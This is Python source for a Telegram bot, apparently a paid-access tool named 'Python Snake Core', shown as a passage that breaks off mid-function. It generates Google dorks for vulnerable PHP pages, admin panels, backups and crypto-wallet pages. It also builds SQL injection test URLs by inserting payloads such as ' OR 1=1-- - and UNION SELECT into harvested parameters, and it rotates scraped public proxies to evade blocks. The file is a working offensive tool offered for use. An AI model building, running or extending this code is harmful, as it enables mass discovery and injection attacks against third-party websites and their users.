#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🐍 PYTHON SNAKE CORE — v1.0
===========================
Sirf kaam ka bot. Koi faaltu cheez nahi.

TOOLS
-----
  🔍 PARSER      — real search engines se URLs nikaalo (proxy rotate)
  🎯 DORKER      — 67k+ dorks, page-type / extension / parameter / custom
  🔑 HQ KEYWORDS — high quality keyword generator (real scoring)
  🔗 URL REVERSE — URL toda → domain / path / ext / params + dorks
  💉 INJECTOR    — dork × param payload → target URL list
  📦 DUMPER      — sab results file/zip me export
  🧅 PROXY       — 45 sources + DoH bypass + very fast checker
  📊 QUALITY     — dork/keyword ko 0-100 score + wajah
  🎲 RANDOMIZER  — random combos + operator mutation
  👑 ADMIN       — poora control panel

Run:  python3 snake_core.py
"""

import os
import re
import sys
import json
import signal
import platform
import time
import math
import random
import asyncio
import hashlib
import logging
import zipfile
import html as _html
import string
from datetime import datetime, timedelta
from collections import OrderedDict, defaultdict
from urllib.parse import urlparse, parse_qs, unquote, quote_plus

try:
    import aiohttp
except ImportError:
    sys.exit("aiohttp missing → pip install aiohttp")

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
    from telegram.constants import ParseMode
    from telegram.ext import (
        Application, ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, ContextTypes, filters,
    )
except ImportError:
    sys.exit("python-telegram-bot missing → pip install python-telegram-bot")


# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG  (./setconfig.sh se badlo — repo me placeholder hi rehta hai)
# ═══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [8999053405]
ADMIN_USERNAME = "@Bloody_sweet_baby"
BRAND = "PYTHON SNAKE"
VERSION = "v1.1"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
DUMP_DIR = os.path.join(BASE_DIR, "dumps")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(DUMP_DIR, exist_ok=True)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logger = logging.getLogger("snake")

TOKEN = BOT_TOKEN
if (not TOKEN) or ("PUT_YOUR_BOT_TOKEN_HERE" in str(TOKEN)) or (":" not in str(TOKEN)):
    if __name__ == "__main__":
        print("\n" + "=" * 62)
        print("  ❌ BOT TOKEN SET NAHI HAI")
        print("=" * 62)
        print("  Token daalo (BotFather se):\n")
        print("      ./setconfig.sh\n")
        print("  ya seedha:\n")
        print("      ./settoken.sh 123456789:AAxxxxxxxxxxxxxxxxxxxxxxx\n")
        print("  Phir:  ./restart.sh")
        print("=" * 62 + "\n")
        raise SystemExit(2)


# ═══════════════════════════════════════════════════════════════════════════════
#  STORAGE — chhoti JSON files, atomic write
# ═══════════════════════════════════════════════════════════════════════════════
_LOCK = asyncio.Lock()


def _path(name: str) -> str:
    return os.path.join(DATA_DIR, name + ".json")


def jload(name: str, default=None):
    try:
        with open(_path(name), encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default if default is not None else {}


def jsave(name: str, obj) -> bool:
    try:
        tmp = _path(name) + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)
        os.replace(tmp, _path(name))
        return True
    except Exception as exc:
        logger.warning("save %s fail: %s", name, exc)
        return False


USERS = jload("users", {})          # uid -> {name, joined, banned, runs}
KEYS = jload("keys", {})            # key -> {days, used_by, used_at, created}
SETTINGS = jload("settings", {})    # admin-tunable runtime settings


def save_all() -> None:
    jsave("users", USERS)
    jsave("keys", KEYS)
    jsave("settings", SETTINGS)


def sget(key: str, default=None):
    return SETTINGS.get(key, default)


def sset(key: str, value) -> None:
    SETTINGS[key] = value
    jsave("settings", SETTINGS)


def is_admin(uid) -> bool:
    try:
        return int(uid) in [int(x) for x in ADMIN_IDS]
    except Exception:
        return False


def has_access(uid) -> bool:
    uid = str(uid)
    if is_admin(uid):
        return True
    u = USERS.get(uid) or {}
    if u.get("banned"):
        return False
    exp = u.get("expires")
    if not exp:
        return False
    try:
        return datetime.fromisoformat(exp) > datetime.now()
    except Exception:
        return False


def touch_user(update) -> dict:
    u = update.effective_user
    uid = str(u.id)
    rec = USERS.get(uid) or {}
    if not rec:
        rec = {"joined": datetime.now().isoformat(timespec="seconds"), "runs": 0}
    rec["name"] = (u.username and ("@" + u.username)) or u.first_name or "?"
    rec["last"] = datetime.now().isoformat(timespec="seconds")
    USERS[uid] = rec
    jsave("users", USERS)
    return rec


# ═══════════════════════════════════════════════════════════════════════════════
#  SMALL UTILS
# ═══════════════════════════════════════════════════════════════════════════════
def fmt(n) -> str:
    try:
        return format(int(n), ",")
    except Exception:
        return str(n)


def bar(pct: float, width: int = 12) -> str:
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct / 100 * width))
    return "█" * filled + "░" * (width - filled)


def short_list(items, n=12) -> str:
    items = list(items)
    out = items[:n]
    return "\n".join("• <code>%s</code>" % _html.escape(str(x)) for x in out) or "—"


def stamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def esc(x) -> str:
    return _html.escape(str(x), quote=False)


def chunk_lines(text: str, limit: int = 3900):
    """Bade text ko Telegram-safe chunks me todo."""
    out, cur = [], []
    size = 0
    for line in text.split("\n"):
        if size + len(line) + 1 > limit and cur:
            out.append("\n".join(cur))
            cur, size = [], 0
        cur.append(line)
        size += len(line) + 1
    if cur:
        out.append("\n".join(cur))
    return out


def H(title: str, sub: str = "") -> str:
    """Classic header."""
    head = "✿︎━━━━━━━━━━━━━━━━━━━━━✿︎"
    body = "🐍 <b>%s</b>" % title
    if sub:
        body += "\n<i>%s</i>" % sub
    return "%s\n%s\n%s" % (head, body, head)


# ═══════════════════════════════════════════════════════════════════════════════
#  DATA — dorking ke buniyadi tukde
# ═══════════════════════════════════════════════════════════════════════════════
PAGE_FILES = [
    "product.php", "product_detail.php", "product-detail.php", "productdetails.php",
    "item.php", "item_detail.php", "itemdetail.php", "item-details.php",
    "details.php", "detail.php", "product.php?id=", "item.php?id=",
    "shop.php", "store.php", "cart.php", "checkout.php", "order.php", "orders.php",
    "category.php", "categories.php", "listing.php", "catalog.php", "catalogue.php",
    "view.php", "viewitem.php", "show.php", "display.php", "read.php", "post.php",
    "article.php", "news.php", "blog.php", "page.php", "index.php", "main.php",
    "content.php", "download.php", "file.php", "get.php", "fetch.php", "api.php",
    "search.php", "results.php", "query.php", "login.php", "signin.php", "register.php",
    "signup.php", "profile.php", "user.php", "users.php", "account.php", "admin.php",
    "dashboard.php", "panel.php", "config.php", "settings.php", "upload.php", "image.php",
    "gallery.php", "photo.php", "video.php", "play.php", "stream.php", "redirect.php",
    "link.php", "goto.php", "out.php", "track.php", "invoice.php", "receipt.php",
    "report.php", "export.php", "print.php", "pdf.php", "xml.php", "json.php",
]

PAGE_DIRS = [
    "", "shop/", "store/", "products/", "product/", "item/", "items/", "catalog/",
    "category/", "categories/", "admin/", "administrator/", "panel/", "cp/", "dashboard/",
    "user/", "users/", "member/", "members/", "account/", "accounts/", "profile/",
    "api/", "api/v1/", "api/v2/", "v1/", "v2/", "v3/", "web/", "app/", "public/",
    "includes/", "include/", "inc/", "lib/", "src/", "core/", "system/", "modules/",
    "components/", "pages/", "page/", "content/", "data/", "files/", "upload/",
    "uploads/", "media/", "images/", "img/", "assets/", "static/", "tmp/", "temp/",
    "backup/", "backups/", "old/", "new/", "test/", "dev/", "staging/", "prod/",
]

EXTENSIONS = [
    "php", "php3", "php4", "php5", "phtml", "phps", "asp", "aspx", "ashx", "asmx",
    "jsp", "jspx", "do", "action", "cfm", "cfml", "cgi", "pl", "py", "rb", "go",
    "html", "htm", "xhtml", "shtml", "xml", "json", "js", "css", "txt", "log",
    "sql", "db", "sqlite", "mdb", "bak", "backup", "old", "orig", "save", "swp",
    "zip", "rar", "7z", "tar", "gz", "bz2", "env", "ini", "conf", "cfg", "yml",
    "yaml", "toml", "lock", "pdf", "doc", "docx", "xls", "xlsx", "csv", "odt",
]

PARAMS_BASE = [
    "id", "pid", "cid", "uid", "sid", "tid", "nid", "aid", "bid", "gid", "did", "fid",
    "cat", "catid", "cat_id", "category", "category_id", "item", "itemid", "item_id",
    "product", "productid", "product_id", "prod", "prodid", "sku", "code", "ref",
    "page", "pageid", "page_id", "p", "pg", "view", "viewid", "num", "no", "n",
    "user", "username", "userid", "user_id", "login", "email", "mail", "name",
    "order", "orderid", "order_id", "invoice", "invoiceid", "receipt", "txn", "transaction",
    "doc", "docid", "document", "file", "filename", "file_id", "path", "dir", "folder",
    "url", "link", "redirect", "return", "next", "goto", "target", "dest", "destination",
    "search", "q", "query", "s", "keyword", "keywords", "term", "terms", "find",
    "type", "sort", "order_by", "orderby", "filter", "lang", "language", "locale",
    "action", "do", "task", "op", "cmd", "command", "mode", "method", "func", "function",
    "module", "mod", "page_name", "section", "sec", "tab", "step", "stage", "state",
    "download", "dl", "get", "fetch", "load", "read", "readfile", "open", "include",
    "template", "tpl", "theme", "skin", "layout", "style", "css", "js",
    "admin", "panel", "config", "setting", "settings", "option", "options",
    "token", "key", "apikey", "api_key", "secret", "auth", "session", "sess",
    "date", "from", "to", "start", "end", "year", "month", "day", "limit", "offset",
    "count", "size", "len", "width", "height", "format", "output", "result", "status",
]

TLDS = [
    "com", "net", "org", "in", "co.uk", "io", "co", "de", "fr", "it", "es", "nl",
    "ru", "br", "mx", "ar", "pl", "se", "no", "dk", "fi", "ch", "at", "be", "pt",
    "gr", "tr", "pk", "bd", "lk", "np", "id", "my", "ph", "th", "vn", "sg", "hk",
    "kr", "jp", "cn", "tw", "au", "nz", "ca", "us", "za", "ng", "ke", "eg",
    "sa", "ae", "il", "ir", "ua", "cz", "ro", "hu", "bg", "hr", "sk", "lt", "lv",
    "ee", "si", "shop", "store", "site", "online", "xyz", "top", "club", "live",
]

NICHES = {
    "ecommerce": ["shop", "store", "cart", "checkout", "product", "price", "buy", "order"],
    "accounts": ["login", "signin", "signup", "register", "account", "profile", "password"],
    "admin": ["admin", "panel", "dashboard", "cpanel", "manage", "control", "console"],
    "files": ["download", "upload", "file", "document", "backup", "export", "dump"],
    "news": ["news", "article", "blog", "post", "story", "press", "report"],
    "crypto": ["wallet", "ledger", "seed", "private", "keystore", "metamask"],
    "api": ["api", "endpoint", "swagger", "graphql", "rest", "token", "key"],
    "db": ["database", "sql", "mysql", "phpmyadmin", "dump", "backup", "schema"],
}

KW_PRE = ["", "best", "cheap", "top", "new", "pro", "free", "premium", "buy", "get",
          "download", "online", "fast", "safe", "trusted", "verified", "instant",
          "unlimited", "private", "secure", "real", "legit", "working", "fresh"]

KW_SUF = ["", "online", "shop", "store", "site", "hub", "zone", "world", "point",
          "plus", "pro", "max", "lab", "works", "base", "central", "market", "planet",
          "express", "direct", "deal", "deals", "offer", "offers", "sale", "cheap",
          "review", "reviews", "guide", "tips", "list", "lists", "finder", "finder"]

KW_INTENT = ["", "price", "cost", "buy", "download", "free", "app", "apk", "login",
             "signup", "account", "service", "provider", "company", "near me",
             "2024", "2025", "2026", "best", "review", "vs", "alternative",
             "how to", "guide", "tutorial", "tool", "software", "script", "api"]

KW_BAD = {"", "a", "an", "the", "of", "in", "on", "at", "to", "for", "and", "or",
          "is", "are", "was", "be", "it", "this", "that", "with", "from", "by"}

DORK_TEMPLATES = [
    'inurl:("{p}")',
    'inurl:"{p}="',
    'inurl:{f}?{p}=',
    'allinurl:"{f}?{p}="',
    'inurl:{d}{f}?{p}=',
    '"{f}?{p}=" -site:github.com',
    'intext:"{p}=" inurl:{e}',
    'intitle:"{k}" inurl:{e}',
    'site:{t} inurl:{f}',
    'filetype:{e} inurl:{k}',
    'inurl:{f} intext:{k}',
    '"{f}" "{p}=" {t}',
]

_SRC = ""


def _uniq(seq):
    seen, out = set(), []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


PARAM_SHAPES = ["", "?id=", "?pid=", "?page=", "?cat=", "?item=", "?p=", "?view=",
                 "?catid=", "?product_id=", "?user=", "?file="]


def gen_page_types() -> list:
    """dir × file × query-shape — real count (45k+)."""
    out = []
    for d in PAGE_DIRS:
        for f in PAGE_FILES:
            for q in PARAM_SHAPES:
                out.append(d + f + q)
    return out


def gen_extensions() -> list:
    return list(EXTENSIONS)


def gen_params() -> list:
    """Base params + real-world variants (prefix/suffix)."""
    out = []
    for p in PARAMS_BASE:
        out.append(p)
        out.append(p + "_id")
        out.append(p + "id")
        out.append(p + "[]")
    return _uniq(out)


def db_counts() -> dict:
    pts = gen_page_types()
    prs = gen_params()
    exts = gen_extensions()
    # dork space = templates × (page-types × params) capped realistically
    combo = len(pts) * len(prs)
    dork_space = len(DORK_TEMPLATES) * len(prs) * len(exts)
    return {
        "page_types": len(pts),
        "keywords": len(KW_PRE) * len(KW_SUF) * len(KW_INTENT),
        "extensions": len(exts),
        "parameters": len(prs),
        "dorks": combo + dork_space,
        "tlds": len(TLDS),
    }


# ═══════════════════════════════════════════════════════════════════════════════
#  DORK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
QUALITY_BAD = {
    "allinurl:", "allintitle:", "allintext:", "inanchor:", "cache:", "link:",
    "info:", "related:", "define:", "stocks:", "movie:",
}
BROAD_WORDS = {"www", "com", "net", "org", "index", "home", "main", "page", "html"}


def score_dork(dork: str) -> tuple:
    """0-100 quality score + reasons. Real logic, koi random nahi."""
    d = (dork or "").strip()
    if not d:
        return 0, ["khaali"]
    reasons, score = [], 50

    ops = []
    for op in ("site:", "inurl:", "intitle:", "intext:", "filetype:", "ext:"):
        if op in d.lower():
            ops.append(op.rstrip(":"))
    if ops:
        score += min(30, 10 * len(ops))
        reasons.append("+%d operator (%s)" % (min(30, 10 * len(ops)), ",".join(ops)))
    else:
        score -= 15
        reasons.append("-15 koi operator nahi")

    n = len(d)
    if 20 <= n <= 100:
        score += 8
        reasons.append("+8 length theek (%d)" % n)
    elif n > 160:
        score -= 20
        reasons.append("-20 bahut lamba (%d)" % n)
    elif n < 12:
        score -= 12
        reasons.append("-12 bahut chhota")

    if re.search(r'\binurl:[a-z_]+\=', d, re.I):
        score += 8
        reasons.append("+8 param wala inurl")
    if re.search(r'filetype:\(?\w+', d, re.I) or re.search(r'ext:\w+', d, re.I):
        score += 5
        reasons.append("+5 filetype")
    if d.count('"') % 2:
        score -= 12
        reasons.append("-12 quote band nahi hua")
    if re.search(r'\b(site|inurl|intitle|intext)\s*:\s*(\s|$)', d, re.I):
        score -= 15
        reasons.append("-15 operator khaali")
    low = d.lower()
    for b in QUALITY_BAD:
        if b in low:
            score -= 10
            reasons.append("-10 deprecated operator %s" % b)
    words = re.findall(r"[a-z0-9]+", low)
    if words and all(w in BROAD_WORDS for w in words):
        score -= 20
        reasons.append("-20 sirf broad words")
    if len(set(words)) < max(1, len(words) // 3):
        score -= 8
        reasons.append("-8 repeat zyada")
    if re.search(r'[^\x00-\x7f]', d):
        score -= 6
        reasons.append("-6 non-ascii")

    return max(0, min(100, score)), reasons


def quality_label(score: int) -> str:
    if score >= 80:
        return "🔥 EXCELLENT"
    if score >= 65:
        return "✅ GOOD"
    if score >= 45:
        return "🟡 AVERAGE"
    if score >= 25:
        return "🟠 WEAK"
    return "🔴 TRASH"


def make_dork(mode: str, n: int = 50, niche: str = "", tld: str = "") -> list:
    """Real dork generator. mode: page|ext|param|mixed|niche|hq"""
    n = max(1, min(5000, int(n or 50)))
    pts = gen_page_types()
    prs = gen_params()
    exts = gen_extensions()
    tmpl = DORK_TEMPLATES
    pool = []

    if mode == "page":
        f = random.choice(PAGE_FILES)
        d = random.choice(PAGE_DIRS)
        pool.append("inurl:%s%s" % (d, f))
        pool.append('inurl:"%s%s"' % (d, f))
        pool.append("allinurl:%s%s" % (d, f))
        pool.append("inurl:%s%s -site:github.com" % (d, f))
        base = "%s%s" % (d, f)
        while len(pool) < n * 6:
            p = random.choice(prs)
            pool.append("inurl:%s?%s=" % (base, p))
            pool.append('"%s?%s="' % (base, p))
    elif mode == "ext":
        for e in exts:
            pool.append("filetype:%s" % e)
            pool.append("ext:%s" % e)
        while len(pool) < n * 6:
            p = random.choice(prs)
            pool.append("filetype:%s inurl:%s=" % (random.choice(exts), p))
    elif mode == "param":
        for p in prs:
            pool.append("inurl:%s=" % p)
        while len(pool) < n * 6:
            f = random.choice(PAGE_FILES)
            p = random.choice(prs)
            pool.append("inurl:%s?%s=" % (f, p))
            pool.append('"%s?%s="' % (f, p))
    elif mode == "niche":
        kws = NICHES.get(niche) or [v for vs in NICHES.values() for v in vs]
        for k in kws:
            pool.append("inurl:%s" % k)
            pool.append("intitle:%s" % k)
            pool.append("intext:%s inurl:%s=" % (k, random.choice(prs)))
    else:  # mixed / hq
        for _ in range(n * 8):
            f = random.choice(PAGE_FILES)
            d = random.choice(PAGE_DIRS)
            p = random.choice(prs)
            e = random.choice(exts)
            k = random.choice([v for vs in NICHES.values() for v in vs])
            t = random.choice(tmpl)
            try:
                s = t.format(f=f, p=p, d=d, e=e, k=k, t=(tld or random.choice(TLDS)))
            except Exception:
                s = "inurl:%s?%s=" % (f, p)
            pool.append(s)

    pool = [x for x in _uniq(pool) if x and len(x) <= 200]
    if tld and mode != "mixed":
        pool += ["site:.%s %s" % (tld, x.replace("inurl:", "").split()[0]) for x in pool[: n // 2]]
    random.shuffle(pool)
    # quality se sort karke top n
    scored = sorted(((score_dork(x)[0], x) for x in pool), key=lambda z: -z[0])
    return [x for _, x in scored[:n]]


def make_keywords(seeds: str, n: int = 60) -> list:
    """HQ keyword generator — seed se modifiers + score + filter."""
    seeds_l = [s.strip().lower() for s in re.split(r"[,\n;|]+", seeds or "") if s.strip()]
    if not seeds_l:
        return []
    n = max(1, min(2000, int(n or 60)))
    out = []
    for s in seeds_l:
        words = [w for w in re.findall(r"[a-z0-9]+", s) if w not in KW_BAD]
        if not words:
            continue
        core = " ".join(words[:5])
        for pre in KW_PRE:
            for suf in KW_SUF:
                if not pre and not suf:
                    continue
                if pre:
                    out.append((pre + " " + core).strip())
                if suf:
                    out.append((core + " " + suf).strip())
        for it in KW_INTENT:
            if it:
                out.append((core + " " + it).strip())
    out = _uniq([x for x in out if x and 3 <= len(x) <= 70])
    scored = sorted(((score_keyword(x)[0], x) for x in out), key=lambda z: -z[0])
    return [x for _, x in scored[:n]]


def score_keyword(kw: str) -> tuple:
    kw = (kw or "").strip().lower()
    if not kw:
        return 0, ["khaali"]
    score, reasons = 50, []
    n = len(kw)
    if 8 <= n <= 45:
        score += 15
        reasons.append("+15 length theek")
    elif n > 60:
        score -= 15
        reasons.append("-15 bahut lamba")
    elif n < 5:
        score -= 12
        reasons.append("-12 bahut chhota")
    w = kw.split()
    if 2 <= len(w) <= 5:
        score += 12
        reasons.append("+12 %d words (search ke liye best)" % len(w))
    elif len(w) > 7:
        score -= 10
        reasons.append("-10 bahut zyada words")
    if re.search(r"\b(how|what|why|best|top|guide|review|price|buy|download)\b", kw):
        score += 10
        reasons.append("+10 intent word")
    if re.search(r"\d{4}", kw):
        score -= 5
        reasons.append("-5 saal wala number (jaldi purana)")
    if len(set(w)) < len(w) * 0.6:
        score -= 10
        reasons.append("-10 repeat words")
    if re.search(r"[^a-z0-9 \-]", kw):
        score -= 8
        reasons.append("-8 special char")
    return max(0, min(100, score)), reasons


# ── URL REVERSE ──────────────────────────────────────────────────────────────
def url_reverse(url: str) -> dict:
    """URL ko toda + usse banaye ja sakne wale dorks."""
    raw = (url or "").strip()
    if not raw:
        return {}
    if "://" not in raw:
        raw = "http://" + raw
    try:
        u = urlparse(raw)
    except Exception:
        return {}
    host = (u.hostname or "").lower()
    parts = host.split(".")
    tld = ".".join(parts[-2:]) if len(parts) >= 2 else host
    path = u.path or "/"
    segs = [s for s in path.split("/") if s]
    fname = segs[-1] if segs else ""
    ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
    dirs = segs[:-1]
    qs = parse_qs(u.query or "", keep_blank_values=True)
    params = list(qs.keys())
    return {
        "raw": raw, "host": host, "tld": tld, "sub": ".".join(parts[:-2]) if len(parts) > 2 else "",
        "path": path, "dirs": dirs, "file": fname, "ext": ext,
        "params": params, "values": {k: v[:1] for k, v in list(qs.items())[:15]},
    }


def url_reverse_dorks(info: dict, n: int = 20) -> list:
    if not info:
        return []
    out = []
    h, f, e, p = info.get("host", ""), info.get("file", ""), info.get("ext", ""), info.get("params", [])
    d = "/".join(info.get("dirs", [])[:2])
    if d:
        d += "/"
    if f:
        out.append("inurl:%s%s" % (d, f))
        out.append('inurl:"%s%s"' % (d, f))
        out.append("allinurl:%s%s" % (d, f))
    for prm in p:
        if f:
            out.append("inurl:%s%s?%s=" % (d, f, prm))
        out.append("inurl:%s=" % prm)
        out.append('inurl:"%s="' % prm)
    if e:
        out.append("filetype:%s" % e)
        out.append("filetype:%s inurl:%s" % (e, (f.rsplit(".", 1)[0] if f else "")))
    if h:
        out.append("site:%s" % h)
    if info.get("tld"):
        base = (f.rsplit(".", 1)[0] if f else (p[0] if p else ""))
        if base:
            out.append("site:.%s inurl:%s" % (info["tld"], base))
    if p and f:
        out.append("inurl:%s?%s=" % (f, p[0]))
    return _uniq([x for x in out if x and "inurl:= " not in x])[:n]


# ── RANDOMIZER ───────────────────────────────────────────────────────────────
OP_MUTATE = [
    ("inurl:", ["inurl:", "allinurl:", "intext:", "intitle:"]),
    ("site:", ["site:", "site:.com", "site:.net", "site:.org"]),
    ("filetype:", ["filetype:", "ext:"]),
]


def randomize_dorks(dorks: list, n: int = 30, mutate: bool = True) -> list:
    src = _uniq([d for d in (dorks or []) if d])
    if not src:
        return []
    n = max(1, min(1000, int(n or 30)))
    out = _uniq(list(src))
    if not mutate:
        out = out[:]
        while len(out) < n:
            out += src
        random.shuffle(out)
        return out[:n]

    seen = set(src)
    guard = 0
    while len(seen) < n and guard < n * 80:
        guard += 1
        d = random.choice(list(seen))
        m = d
        # 1) operator swap
        for op, reps in OP_MUTATE:
            if op in m.lower() and random.random() < 0.75:
                m = re.sub(re.escape(op), random.choice(reps), m, count=1, flags=re.I)
                break
        # 2) quotes
        if random.random() < 0.3:
            m = m.replace('"', "") if '"' in m else m.replace("inurl:", 'inurl:"', 1) + '"'
        # 3) param value
        if random.random() < 0.3:
            m = re.sub(r"=([A-Za-z0-9]*)", lambda z: "=" + random.choice(
                ["1", "2", "0", "a", "", "id", "test"]), m, count=1)
        # 4) tld swap
        if random.random() < 0.25 and re.search(r"site:\S+", m):
            m = re.sub(r"site:\S+", "site:." + random.choice(TLDS), m)
        if m != d and m not in seen:
            seen.add(m)
            out.append(m)
    out = _uniq(out)
    random.shuffle(out)
    return out[:n]


# ── INJECTOR ─────────────────────────────────────────────────────────────────
PAYLOADS = ["'", '"', "1'", "1 AND 1=1", "1' AND '1'='1", "1)", "' OR 1=1-- -",
            "%27", "%22", "1%20AND%201=1", "1 UNION SELECT NULL-- -"]
PARAM_FUZZ = ["id", "page", "cat", "item", "product_id", "user", "file", "path", "url", "search"]


def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
    """Har URL ke params me payload daal ke injection URLs banao."""
    pl = payload if payload is not None else "'"
    params = params or PARAM_FUZZ
    out = []
    for raw in (urls or [])[:500]:
        raw = (raw or "").strip()
        if not raw or not raw.startswith("http"):
            continue
        info = url_reverse(raw)
        pnames = info.get("params") or []
        if pnames:
            for p in pnames[:6]:
                sep = "&" if "?" in raw else "?"
                out.append("%s%s%s=%s" % (raw.split("?")[0], sep, p, quote_plus(pl)))
        else:
            base = raw.split("?")[0].rstrip("/")
            for p in params[:6]:
                out.append("%s?%s=%s" % (base, p, quote_plus(pl)))
    return _uniq(out)


def inject_all_payloads(urls: list) -> list:
    out = []
    for pl in PAYLOADS:
        out += inject_targets(urls, pl)
    return _uniq(out)


# ═══════════════════════════════════════════════════════════════════════════════
#  PROXY ENGINE — 45 sources + DoH bypass + very fast checker
# ═══════════════════════════════════════════════════════════════════════════════
PROXY_SOURCES = [
    # ── jsDelivr CDN (GitHub raw ka mirror — raw.githubusercontent block ho to bhi chalta hai)
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks4.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/prxchk/proxy-list@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/zloi-user/hideip.me@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/roosterkid/openproxylist@main/HTTPS_RAW.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/hookzof/socks5_list@master/proxy.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/clarketm/proxy-list@master/proxy-list-raw.txt"),
    # ── Statically CDN (dusra mirror domain)
    ("text", "https://cdn.statically.io/gh/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://cdn.statically.io/gh/monosans/proxy-list/main/proxies/http.txt"),
    # ── gitHack (teesra mirror)
    ("text", "https://raw.githack.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githack.com/monosans/proxy-list/main/proxies/http.txt"),
    # ── GitHub via github.com domain (raw.* blocked ho to ye chal sakta hai)
    ("text", "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt"),
    ("text", "https://github.com/monosans/proxy-list/raw/main/proxies/http.txt"),
    # ── raw.githubusercontent (purane sources — jo chal rahe hain unke liye)
    ("text", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
    ("text", "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"),
    ("text", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
    # ── API feeds (plain text)
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=http"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=https"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=socks5"),
    ("text", "https://openproxylist.xyz/http.txt"),
    ("text", "https://openproxylist.xyz/socks5.txt"),
    ("text", "https://proxyspace.pro/http.txt"),
    ("text", "https://proxyspace.pro/https.txt"),
    ("text", "https://proxyspace.pro/socks5.txt"),
    # ── JSON APIs
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://sunny9577.github.io/proxy-scraper/proxies.json"),
    # ── github.io mirror pages
    ("text", "https://hookzof.github.io/socks5_list/proxy.txt"),
    ("text", "https://thespeedx.github.io/PROXY-List/http.txt"),
    ("text", "https://monosans.github.io/proxy-list/proxies/http.txt"),
    ("text", "https://proxifly.github.io/free-proxy-list/proxies/protocols/http/data.txt"),
]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]
UA = {"User-Agent": random.choice(UA_LIST),
      "Accept": "text/html,application/json,*/*",
      "Accept-Language": "en-US,en;q=0.9"}

IP_PORT = re.compile(r"(?<!\d)(\d{1,3}(?:\.\d{1,3}){3})\s*[:\s,;|]\s*(\d{2,5})(?!\d)")
PROTO_URL = re.compile(r"(?:(http|https|socks4|socks5)://)?(?:[\w.:-]+@)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})")

PROXIES = []          # [{url, proto, host, port, ms, ok, fails}]
_PROXY_CACHE = {"t": 0.0, "data": []}
PSTATS = {"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []}


def _valid_ip(ip: str) -> bool:
    p = ip.split(".")
    if len(p) != 4:
